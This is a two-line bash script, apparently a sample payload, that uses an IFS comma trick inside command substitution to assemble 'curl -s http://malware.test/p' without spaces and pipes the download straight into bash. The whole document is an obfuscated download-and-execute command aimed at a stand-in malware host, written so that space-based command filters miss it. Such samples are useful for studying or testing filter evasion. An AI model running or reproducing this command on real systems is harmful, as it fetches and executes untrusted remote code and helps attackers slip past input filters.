#!/bin/bash
IFS=,;$(echo curl,-s,http://malware.test/p)|bash
